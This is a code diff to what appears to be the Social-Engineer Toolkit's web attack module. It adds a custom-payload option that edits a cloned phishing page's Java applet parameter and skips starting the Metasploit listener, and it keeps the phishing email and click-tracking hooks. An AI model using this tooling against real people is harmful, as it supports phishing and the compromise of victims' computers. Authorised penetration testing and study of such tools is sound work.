@@ -22,6 +22,23 @@ if applet_name == "":
 	applet_name = generate_random_string(6, 15) + ".jar"
 	update_options("APPLET_NAME=" + applet_name)
 
+# define if we are using a custom payload
+custom = 0
+if check_options("CUSTOM_EXE="): 
+	custom = 1
+	print_status("Note that since you are using a custom payload, you will need to create your OWN listener.")
+	print_status("SET has no idea what type of payload you are using, so you will need to set this up manually.")
+	print_status("If using a custom Metasploit payload, setup a multi/handler, etc. to capture the connection back.")
+
+        # here we need to modify the java applet to recognize custom attribute
+        fileopen3 = fileopen = file("%s/web_clone/index.html" % (setdir), "r")
+        filewrite = file("%s/web_clone/index.html.new" % (setdir), "w")
+        data = fileopen3.read()
+        data = data.replace('param name="8" value="YES"', 'param name="8" value="CUST"')
+        filewrite.write(data)
+        filewrite.close()
+	subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (setdir,setdir), shell=True).wait()
+
 
 # set current path
 definepath=os.getcwd()
@@ -493,14 +510,18 @@ try:
             meta_config = "meta_config"
             if os.path.isfile(setdir + "/meta_config_multipyinjector"):
                 meta_config = "meta_config_multipyinjector"
-            child1=pexpect.spawn("ruby %s/msfconsole -L -r %s/%s" % (msf_path,setdir,meta_config))
-        # check if we want to deliver emails or track users that click the link
-        webattack_email = check_config("WEBATTACK_EMAIL=").lower()
-        if webattack_email == "on" or track_email == "on":
-            try: reload(src.phishing.smtp.client.smtp_web)
-            except: import src.phishing.smtp.client.smtp_web
+	    # if we arent using a custom payload
+	    if custom != 1:
+	            child1=pexpect.spawn("%smsfconsole -r %s/%s" % (msf_path,setdir,meta_config))
+            # check if we want to deliver emails or track users that click the link
+            webattack_email = check_config("WEBATTACK_EMAIL=").lower()
+            if webattack_email == "on" or track_email == "on":
+            	try: reload(src.phishing.smtp.client.smtp_web)
+            	except: import src.phishing.smtp.client.smtp_web
 
-        child1.interact()
+	# if we arent using a custom payload
+        if custom != 1:
+	        child1.interact()
 
     if os.path.isfile(setdir + "/set.payload"):
         port = check_options("PORT=")
